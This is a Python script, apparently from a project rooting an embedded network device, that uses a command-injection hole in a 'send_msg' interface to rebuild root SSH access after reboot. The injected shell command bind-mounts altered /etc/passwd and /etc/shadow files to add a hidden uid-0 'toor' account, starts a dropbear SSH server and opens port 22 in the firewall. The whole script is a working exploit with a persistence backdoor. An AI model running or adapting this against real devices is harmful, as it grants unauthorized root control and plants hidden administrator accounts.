#!/usr/bin/env python3
"""Re-arm the SSH root channel on STOCK firmware after a reboot (fallback
persistence; not needed on the custom slot-A firmware where it is baked in).

Sends ONE send_msg injection that rebuilds via bind-mounts:
  /etc/passwd (+toor:x:0:0), /etc/shadow (+toor $1$ MD5),
  /etc/dropbear (755 dir), dropbear host key, LAN-only iptables allow.

After ~10s: ssh toor@<host>  (password = TOOR_PASS in device_local.py)
"""
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import device_local as D
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import login_and_read as L


def _b64_file(path):
    return base64.b64encode(open(path, "rb").read().strip()).decode()


def main():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    passwd_b64 = _b64_file(os.path.join(root, "backup", "px1.txt"))
    shadow_b64 = _b64_file(os.path.join(root, "backup", "sx1.txt"))
    # append toor lines
    passwd = base64.b64decode(passwd_b64) + f"\n{D.TOOR_USER}:x:0:0:root:/tmp/h:/bin/ash\n".encode()
    shadow = base64.b64decode(shadow_b64) + f"\n{D.TOOR_USER}:{D.TOOR_HASH}:19953:0:99999:7:::\n".encode()
    pb, sb = base64.b64encode(passwd).decode(), base64.b64encode(shadow).decode()
    cmd = (
        "echo " + pb + " | openssl base64 -d -A > /tmp/passwd; chmod 644 /tmp/passwd; "
        "mount --bind /tmp/passwd /etc/passwd; "
        "echo " + sb + " | openssl base64 -d -A > /tmp/shadow; chmod 600 /tmp/shadow; "
        "mount --bind /tmp/shadow /etc/shadow; "
        "mkdir -p /tmp/dbd; chmod 755 /tmp/dbd; mount --bind /tmp/dbd /etc/dropbear; "
        "dropbearkey -t ed25519 -f /tmp/db_ed > /tmp/rearm.log 2>&1; "
        "/usr/sbin/dropbear -E -p 22 -r /tmp/db_ed >> /tmp/rearm.log 2>&1 & "
        f"iptables -I INPUT 1 -p tcp -s {D.LAN_CIDR} --dport 22 -j ACCEPT"
    )
    st, out = L.send_msg_inject(cmd)
    print("send:", st, out[:80])
    print("wait ~10s, then: ssh", D.TOOR_USER + "@" + D.HOST, "(password in device_local.py)")


if __name__ == "__main__":
    main()
